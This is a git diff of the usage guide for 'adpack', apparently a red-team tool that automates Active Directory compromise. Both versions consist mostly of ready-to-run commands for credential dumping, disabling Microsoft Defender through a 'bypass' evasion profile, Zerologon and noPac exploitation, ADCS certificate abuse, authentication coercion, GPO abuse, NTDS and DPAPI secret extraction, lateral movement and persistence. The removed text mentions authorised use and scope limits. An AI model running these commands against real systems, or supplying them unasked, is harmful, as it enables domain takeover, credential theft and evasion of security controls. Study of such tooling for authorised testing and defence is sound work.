@@ -1,561 +1,292 @@
-# adpack Usage Guide
+# AdPack Usage Guide
 
-## Table of Contents
+Complete command reference for adpack v0.4.0.
 
-- [Installation](#installation)
-- [Configuration](#configuration)
-- [Attack Phases](#attack-phases)
-- [Evasion Profiles](#evasion-profiles)
-- [Command Reference](#command-reference)
-- [Workflows](#workflows)
-- [Tool Integration](#tool-integration)
-
-## Installation
-
-### Automated Setup
-
-Run `./setup.sh` to install everything:
+## Quick Start
 
 ```bash
-git clone https://github.com/Yenn503/adpack.git
-cd adpack
-chmod +x setup.sh
-./setup.sh
-source ~/.bashrc
+adpack status                          # View current state and gaps
+adpack next                            # Show recommended next phase
+adpack run discovery -t 10.0.0.5       # Find domain controllers
+adpack run enumeration -t 10.0.0.5     # Enumerate users and computers
+adpack run credential_acq -t 10.0.0.5  # Extract credentials
+adpack validate                        # Test creds across protocols
+adpack run lateral -t 10.0.0.6         # Lateral movement
 ```
 
-### Prerequisites
+## Automated Attack Chain
 
 ```bash
-# Install Go 1.25+
-wget https://go.dev/dl/go1.25.10.linux-amd64.tar.gz
-sudo tar -C /usr/local -xzf go1.25.10.linux-amd64.tar.gz
-export PATH=$PATH:/usr/local/go/bin
-
-# Install NetExec
-pipx install netexec
-
-# Optional tools for evasion
-# Donut: https://github.com/TheWover/donut
-# nanodump: https://github.com/fortra/nanodump
-# go-mimikatz: https://github.com/vyrus001/go-mimikatz
+adpack autorun --target 192.168.57.22 \
+  --domain north.sevenkingdoms.local \
+  --user samwell.tarly --password Heartsbane \
+  --execute --skip-fail
 ```
 
-### Build
-
-```bash
-git clone https://github.com/Yenn503/adpack.git
-cd adpack
-go build -o adpack .
-sudo mv adpack /usr/local/bin/
-```
-
-### Verify
-
-```bash
-adpack version
-adpack status
-```
-
-## Configuration
-
-### Default Config
-
-adpack works without a config file. State is stored in `~/.adpack/state.db`.
-
-### Custom Config
-
-Create `~/.adpack/config.yaml`. See [config.example.yaml](../config.example.yaml) for all options:
-
-```yaml
-db_path: ""
-nmap_args: ["-T4", "-sn"]
-nxc_path: "netexec"
-bh_python: "bloodhound-python"
-
-cracking:
-  hashcat_path: "/usr/bin/hashcat"
-  wordlist: "/usr/share/wordlists/rockyou.txt"
-  rules: ["/usr/share/hashcat/rules/best64.rule"]
-  timeout_seconds: 600
-
-viper:
-  enabled: false
-  host: "localhost"
-  port: 7687
-```
-
-### Scope Enforcement
-
-Add a `scope` key to config.yaml to restrict targets to specific CIDR ranges:
-
-```yaml
-scope:
-  - "10.0.0.0/8"
-  - "192.168.1.0/24"
-```
-
-When scope is set, `adpack run --target` checks the target IP against the scope and rejects out-of-range targets. This is a safety net for production engagements.
-
-## Attack Phases
-
-### 1. Discovery
-
-Finds DCs and network layout.
-
-```bash
-# Manual target
-adpack run discovery --target 10.0.0.5
-
-# Auto-discovery via LDAP ping
-adpack run discovery
-```
-
-### 2. Enumeration
-
-Grabs users, computers, groups via LDAP.
-
-```bash
-adpack run enumeration --target 10.0.0.5
-```
-
-### 3. Credential Acquisition
-
-Dumps creds using an evasion profile.
-
-```bash
-# Standard profile
-adpack run credential_acq -e standard -t 10.0.0.5
-
-# Bypass profile (includes Defender neutralisation pre-flight)
-adpack run credential_acq -e bypass -t 10.0.0.5
-```
-
-### 4. Session Harvesting
-
-Finds active user sessions on domain systems.
-
-```bash
-adpack run session_harvest --target 10.0.0.5
-```
-
-### 5. Graph Analysis
-
-Collects AD structure for attack path mapping.
-
-```bash
-adpack run graph_analysis --target 10.0.0.5
-adpack query "MATCH (u:User)-[:AdminTo]->(c:Computer) RETURN u.name, c.name"
-```
-
-### 6. Lateral Movement
-
-Moves between systems with validated creds.
-
-```bash
-adpack run lateral --target 10.0.0.6
-```
-
-### 7. Validation
-
-Tests creds across SMB, LDAP, WinRM, RDP.
-
-```bash
-adpack validate
-adpack validate --target 10.0.0.5
-```
-
-### 8. Privilege Escalation
-
-Checks for misconfigs and vulnerabilities.
-
-```bash
-adpack run privesc --target 10.0.0.5
-```
-
-### 9. Persistence
-
-Deploys long-term access mechanisms.
-
-```bash
-adpack run persistence --target 10.0.0.5
-```
-
-## Evasion Profiles
-
-### Standard
-
-Remote execution for enterprise. Default profile.
-
-```bash
-adpack run credential_acq -e standard -t 10.0.0.5
-```
-
-### Bypass
-
-Standard profile with automatic UnDefend Defender neutralisation pre-flight.
-
-```bash
-adpack run credential_acq -e bypass -t 10.0.0.5
-```
-
-### Custom
-
-User-defined pipeline for custom configurations.
-
-```bash
-adpack run credential_acq -e custom -t 10.0.0.5
-```
-
-## Command Reference
-
-### Core Commands
-
-#### status
-
-Shows current state and gaps.
-
-```bash
-adpack status
-adpack status --json  # JSON output for automation
-```
-
-#### next
-
-Shows next phase and why.
-
-```bash
-adpack next
-```
-
-#### run
-
-Runs a single attack phase.
+Flags:
+- `--target` — Target IP or hostname
+- `--domain` — Domain name
+- `--user` — Username for initial authentication
+- `--password` — Password for initial authentication
+- `--execute` — Actually execute phases (omit for dry-run)
+- `--skip-fail` — Continue past failed phases
+- `--resume` — Resume from last completed phase
+- `--dry-run` — Preview without executing
+- `--provider-log <file>` — Write provider events as JSONL
+
+## Phase Execution
 
 ```bash
 adpack run <phase> [flags]
+```
+
+Phases: `discovery`, `enumeration`, `credential_acq`, `session_harvest`, `graph_analysis`, `lateral`, `validation`, `privesc`, `persistence`
 
 Flags:
-  -t, --target string             Target host IP or hostname
-  -e, --evasion-profile string    Evasion profile (default "standard")
-  -x, --execute                   Execute planned privilege escalation paths
-      --dry-run                   Show what would be done without executing
-      --resume                    Resume phase execution, skipping completed hosts
-      --provider-log string       File path for structured provider event logging (JSONL)
+- `-t, --target` — Target IP or hostname
+- `-e, --evasion` — Evasion profile (standard, bypass, custom)
+- `--resume` — Resume partially-completed phase
+- `--dry-run` — Preview without executing
+- `--provider-log <file>` — Write provider events as JSONL
+
+## State Management
+
+### Status & Navigation
+```bash
+adpack status              # Full state overview with gaps
+adpack next                # Recommended next phase
+adpack phases              # Table of all phases with status
+adpack loot                # Comprehensive loot summary
+adpack reset               # Reset all state (requires confirmation)
 ```
 
-`--dry-run` prints the planned actions for a phase without actually executing them. Useful for reviewing what a phase will do before running it.
-
-`--resume` skips hosts that were already processed in a previous run of the same phase. Marks failed hosts for re-execution and completed hosts as done.
-
-#### autorun
-
-Auto-runs the full attack chain.
-
+### Session Management
 ```bash
-adpack autorun [flags]
-
-Flags:
-  -t, --target string             Target host IP or hostname
-  -e, --evasion-profile string    Evasion profile (default "standard")
-  -x, --execute                   Execute planned privilege escalation paths
-  -m, --max int                   Maximum phases to run (0 = unlimited)
-      --skip-fail                 Continue past failed phases instead of stopping
-      --domain string             Domain for seed credentials
-      --user string               Username for seed credentials
-      --password string           Password for seed credentials
-      --provider-log string       File path for structured provider event logging (JSONL)
+adpack session save <name>           # Save current state
+adpack session load <name>           # Load saved state
+adpack session list                  # List all saved sessions
+adpack session delete <name>         # Delete a session
+adpack session export <name> [-o]    # Export to portable JSON
+adpack session import <name> <file>  # Import from JSON envelope
 ```
 
-#### validate
-
-Tests creds across protocols.
+## Credential Operations
 
 ```bash
-adpack validate [flags]
-
-Flags:
-  -t, --target string    Target host (validates against all hosts if not specified)
+adpack cred list [--format json|csv] [--show-secrets]
+adpack cred export [--output <file>] [--show-secrets]
+adpack cred status
+adpack cred verify [username] [-t <target>]
 ```
 
-### Interactive Mode
+- `--show-secrets` — Include plaintext secrets in output
+- `--format` — Output format (json, csv, or table default)
+- `verify` — Tests unvalidated creds against target via SMB
 
-#### interactive
-
-Opens the TUI dashboard.
+## Kerberos Operations
 
 ```bash
-adpack interactive
+adpack kerb tgt <user> <password> <domain> <dc-ip>     # Request TGT
+adpack kerb list                                         # List cached tickets
+adpack kerb destroy                                      # Destroy all tickets
+adpack kerb s4u <user> <domain> <dc-ip> <target>        # S4U2self + S4U2proxy
 ```
 
-Launches a terminal UI that shows:
-- Phase completion status with colour-coded indicators
-- Discovered hosts, users, and credentials
-- Phase dependency chain with gap detection
-- Live status updates
-
-The TUI refreshes automatically from the SQLite state database. Use it to monitor progress during autoruns or inspect state between phases.
-
-### State Management
-
-#### reset
-
-Resets phase status or entire state.
+## ADCS Exploitation
 
 ```bash
-adpack reset <phase>    # Reset specific phase status
-adpack reset state      # Clear entire database
+adpack adcs find --dc-ip <ip> [--user <u> --password <p> --domain <d>]
+adpack adcs esc1 --dc-ip <ip> --template <t> --upn <u> --ca <ca>
+adpack adcs esc3 --dc-ip <ip> --template <t> --upn <u> --ca <ca>
+adpack adcs esc4 --dc-ip <ip> --template <t>
+adpack adcs esc6 --dc-ip <ip> --template <t> --ca <ca>
+adpack adcs esc8 --dc-ip <ip> --listen <ip> --template <t>
+adpack adcs esc9 --dc-ip <ip> --template <t> --target <u> --ca <ca>
+adpack adcs esc10 --dc-ip <ip> --target <u> --ca <ca>
+adpack adcs esc13 --dc-ip <ip> --template <t> --ca <ca>
+adpack adcs auth --pfx <file> --dc-ip <ip>
 ```
 
-#### phases
+ESC techniques require certipy (`pipx install certipy-ad`).
 
-Lists all phases with status and dependencies.
+## Zerologon (CVE-2020-1472)
 
 ```bash
-adpack phases
+adpack zerologon check --dc-ip <ip>
+adpack zerologon exploit --dc-ip <ip> --dc-name <name>
+adpack zerologon dcsync --dc-ip <ip> --dc-name <name>
+adpack zerologon restore --dc-ip <ip> --dc-name <name> --hash <nt_hash>
 ```
 
-#### profiles
+**WARNING**: The exploit resets the DC machine account password. The DC will be non-functional until restored. Always save the original hash first.
 
-Shows available evasion profiles.
+## noPac (CVE-2021-42278/42287)
 
 ```bash
-adpack profiles
+adpack nopac check --dc-ip <ip> [--domain <d> --user <u> --password <p>]
+adpack nopac exploit --dc-ip <ip> --domain <d> --user <u> --password <p> [--target-user <u>]
+adpack nopac dcsync --dc-ip <ip> --domain <d> [--dc-hostname <h>]
+adpack nopac scan --target <cidr>
 ```
 
-#### loot
-
-Displays a comprehensive loot summary from the current state.
+## Coercion Attacks
 
 ```bash
+adpack coerce printerbug --target <ip> --listen <ip>
+adpack coerce petitpotam --target <ip> --listen <ip>
+adpack coerce dfscoerce --target <ip> --listen <ip>
+adpack coerce shadow --target <ip> --listen <ip>
+adpack coerce all --target <ip> --listen <ip>
+```
+
+All coercion methods require a relay listener running on the listen IP.
+
+## Domain Trust Attacks
+
+```bash
+adpack trust list --dc-ip <ip> --user <u> --password <p> --domain <d>
+adpack trust keys --dc-ip <ip> --user <u> --password <p> --domain <d>
+adpack trust inter-realm --target-domain <d> --dc-ip <ip> --trust-key <k>
+adpack trust sidhistory --target-domain <d> --dc-ip <ip> --domain <d>
+```
+
+## Shadow Copy NTDS Extraction
+
+```bash
+adpack shadow ntds --target <ip> --user <u> --password <p> --domain <d>
+adpack shadow ifm --target <ip> --user <u> --password <p> --domain <d>
+adpack shadow parse --ntds <file> --system <file>
+```
+
+## GPO Abuse
+
+```bash
+adpack gpo create --name <n> --ou <ou> --target <ip>
+adpack gpo runkey --name <n> --cmd <c> --target <ip>
+adpack gpo task --name <n> --payload <p> --target <ip>
+adpack gpo localadmin --name <n> --target-user <u> --target <ip>
+adpack gpo find --target <ip>
+```
+
+## DPAPI Operations
+
+```bash
+adpack dpapi backupkey --dc-ip <ip> [--user <u> --password <p> --domain <d>]
+adpack dpapi masterkey --file <f> --pvk <pvk>
+adpack dpapi blob --file <f> --key <k>
+adpack dpapi vault --file <f> --key <k>
+adpack dpapi chrome --state <f> --key <k>
+adpack dpapi triage --dc-ip <ip> --user <u> --password <p> --domain <d>
+adpack dpapi credentials --dc-ip <ip> --user <u> --password <p> --domain <d>
+```
+
+## gMSA & LAPS
+
+```bash
+adpack gmsa list --dc-ip <ip> --domain <d> --user <u> --password <p>
+adpack gmsa read --dc-ip <ip> --domain <d> --user <u> --password <p> --name <n>
+adpack laps list --dc-ip <ip> --domain <d> --user <u> --password <p>
+```
+
+## Reporting
+
+```bash
+adpack report html --output report.html
+adpack report md --output report.md
+adpack report json --output report.json
+```
+
+## Validation Suite
+
+```bash
+adpack validate [-t <target>]    # Validate credentials against hosts
+adpack validate tools             # Check all tool dependencies
+adpack validate config            # Validate config file
+adpack validate setup             # Full setup validation (tools + config)
+```
+
+## BloodHound Integration
+
+```bash
+adpack bloodhound collect --dc-ip <ip> --user <u> --password <p> --domain <d>
+adpack ingest <file>              # Import BloodHound JSON
+adpack query <cypher>             # Run Cypher query against Neo4j
+```
+
+## Utility Commands
+
+```bash
+adpack interactive     # Launch TUI dashboard
+adpack profiles        # List evasion profiles
+adpack completion <shell>  # Generate shell completion (bash|zsh|fish|powershell)
+adpack version [--json]    # Print version
+```
+
+## Global Flags
+
+| Flag | Description |
+|------|-------------|
+| `-c, --config` | Config file path (default: `~/.adpack/config.yaml`) |
+| `-d, --db` | Database path (default: `~/.adpack/state.db`) |
+| `--hashcat-path` | Path to hashcat binary |
+| `--wordlist` | Path to wordlist |
+| `--rules` | Comma-separated hashcat rule files |
+| `--crack-timeout` | Timeout in seconds per hash |
+
+## Environment Variables
+
+| Variable | Description |
+|----------|-------------|
+| `ADPACK_PROXY` | SOCKS5 proxy address for transport routing |
+| `GO_VERSION` | Go version for setup.sh (default: 1.25.10) |
+| `KRB5CCNAME` | Kerberos credential cache path |
+
+## Workflow Examples
+
+### Full Engagement
+```bash
+# 1. Seed initial credentials
+adpack autorun --target 10.0.0.10 --domain corp.local \
+  --user jsmith --password Spring2024 --execute --skip-fail
+
+# 2. Review state
+adpack status
 adpack loot
+
+# 3. Save session
+adpack session save corp_engagement_01
+
+# 4. Generate report
+adpack report html --output corp_report.html
 ```
 
-Shows credentials, validated creds, domain info, vulnerability coverage, and backdoor status.
-
-### Utility Commands
-
-#### ingest
-
-Imports tool output.
-
+### Manual Step-by-Step
 ```bash
-adpack ingest <file>
-```
-
-#### query
-
-Runs a Cypher query against the BloodHound graph (requires Neo4j connection).
-
-```bash
-adpack query "MATCH (u:User) RETURN u.name LIMIT 10"
-```
-
-### Flags
-
-#### Global Flags
-
-```bash
--c, --config string         Config file path
--d, --db string             Database path (default ~/.adpack/state.db)
-    --hashcat-path string   Path to hashcat binary (overrides config)
-    --wordlist string       Path to wordlist (overrides config)
-    --rules string          Comma-separated hashcat rule files (overrides config)
-    --crack-timeout int     Timeout per hash in seconds (overrides config)
-```
-
-## Cracking Pipeline
-
-Extracted hashes are automatically enqueued into a background cracker pipeline:
-
-1. Hashes are collected from Kerberoast, AS-REP roasting, and SAM/LSA dumps
-2. Enqueued in a priority-ordered HashQueue (DA accounts first)
-3. Cracked via hashcat with configurable rules and wordlist
-4. Cracked credentials materialise into the state database
-5. Triggers re-evaluation of privesc paths when new creds arrive
-
-The cracker runs as a background goroutine, started on the first command. Configuration is in the `cracking` config section:
-
-```yaml
-cracking:
-  hashcat_path: "/usr/bin/hashcat"
-  wordlist: "/usr/share/wordlists/rockyou.txt"
-  rules: ["/usr/share/hashcat/rules/best64.rule"]
-  timeout_seconds: 600
-```
-
-Global flags override config values at runtime:
-
-```bash
-adpack run enumeration --target 10.0.0.5 --hashcat-path /opt/hashcat/hashcat
-```
-
-## Workflows
-
-### Basic Workflow
-
-```bash
-# 1. Check initial state
-adpack status
-
-# 2. Discover DCs
-adpack run discovery --target 10.0.0.5
-
-# 3. Enumerate users
-adpack run enumeration --target 10.0.0.5
-
-# 4. Acquire creds
-adpack run credential_acq --target 10.0.0.5
-
-# 5. Validate creds
+adpack run discovery -t 10.0.0.0/24
+adpack run enumeration -t 10.0.0.10
+adpack run credential_acq -e bypass -t 10.0.0.10
 adpack validate
-
-# 6. Check progress
-adpack status
+adpack run session_harvest -t 10.0.0.10
+adpack run graph_analysis -t 10.0.0.10
+adpack run lateral -t 10.0.0.11
+adpack run privesc -t 10.0.0.10
+adpack run persistence -t 10.0.0.10
 ```
 
-### Automated Workflow
-
+### Targeted Exploit Chain
 ```bash
-# Run first 5 phases automatically
-adpack autorun --target 10.0.0.5 --max 5
+# Check for Zerologon
+adpack zerologon check --dc-ip 10.0.0.10
 
-# Full automated chain
-adpack autorun --target 10.0.0.5
+# Save original hash before exploit
+adpack zerologon exploit --dc-ip 10.0.0.10 --dc-name DC01
+adpack zerologon dcsync --dc-ip 10.0.0.10 --dc-name DC01
+adpack zerologon restore --dc-ip 10.0.0.10 --dc-name DC01 --hash <hash>
 ```
 
-### Resume After Interruption
-
+### ADCS Attack Path
 ```bash
-# Start an autorun
-adpack autorun --target 10.0.0.5 --max 4
-
-# If it's interrupted, check status
-adpack status
-
-# Resume the next phase manually
-adpack run credential_acq --target 10.0.0.5 --resume
-
-# Or resume the full chain from where it left off
-adpack autorun --target 10.0.0.5
+adpack adcs find --dc-ip 10.0.0.10 -u jsmith -p pass -d corp.local
+adpack adcs esc1 --dc-ip 10.0.0.10 --template CorpWebServer \
+  --upn Administrator@corp.local --ca CORP-DC01-CA
 ```
-
-### Preview Before Execution
-
-```bash
-# See what a phase will do without running it
-adpack run credential_acq --target 10.0.0.5 --dry-run
-
-# Validate the chain plan
-adpack next
-```
-
-### Scoped engagement
-
-```yaml
-# In ~/.adpack/config.yaml:
-scope:
-  - "10.0.1.0/24"
-```
-
-```bash
-# This will work
-adpack run discovery --target 10.0.1.10
-
-# This will be rejected
-adpack run discovery --target 10.0.2.10
-# Error: target 10.0.2.10 is outside allowed scope Scope{10.0.1.0/24}
-```
-
-### Advanced Evasion Workflow
-
-```bash
-# 1. Enumerate target
-adpack run enumeration --target 10.0.0.5
-
-# 2. Use bypass profile to neutralise Defender before dump
-adpack run credential_acq -e bypass -t 10.0.0.5
-
-# 3. Chain with Defender kill + dump
-adpack run credential_acq -e bypass -t 10.0.0.5
-
-# 4. Validate extracted creds
-adpack validate
-
-# 5. Lateral movement
-adpack run lateral --target 10.0.0.6
-```
-
-### Multi-Host Workflow
-
-```bash
-# Enumerate multiple hosts
-for ip in 10.0.0.{5..10}; do
-  adpack run discovery --target $ip
-done
-
-# Validate creds across all hosts
-adpack validate
-
-# Check which hosts are accessible
-adpack status
-```
-
-## Tool Integration
-
-### NetExec
-
-Main tool for remote exec and enumeration.
-
-**Supported Protocols**:
-- SMB: File sharing, remote execution
-- LDAP: User/computer enumeration
-- WinRM: PowerShell remoting
-- MSSQL: Database queries
-
-### nanodump
-
-LSASS dumping with evasion techniques (fork, snapshot, WER).
-
-### go-mimikatz
-
-Go port of mimikatz for sekurlsa::logonpasswords, dcsync. Requires Windows build.
-
-### pypykatz
-
-Offline LSASS dump parsing.
-
-## Troubleshooting
-
-### No Hosts Discovered
-
-```bash
-ping 10.0.0.5
-netexec --version
-adpack run discovery --target 10.0.0.5
-```
-
-### Credential Acquisition Failed
-
-```bash
-which go-mimikatz
-which nanodump
-adpack run credential_acq -e nanodump -t 10.0.0.5
-adpack status
-```
-
-### Validation Fails
-
-```bash
-netexec smb 10.0.0.5 -u user -p password
-netexec smb 10.0.0.5 -u user -p password --shares
-```
-
-## Security Considerations
-
-- Only use on authorised targets
-- Credentials are encrypted at rest using AES-GCM in SQLite
-- Protect state database with 600 permissions
-- Use disk encryption for sensitive engagements
-- Clean up after engagements: `adpack reset state`
-- Scope enforcement helps prevent accidental targeting of out-of-range hosts
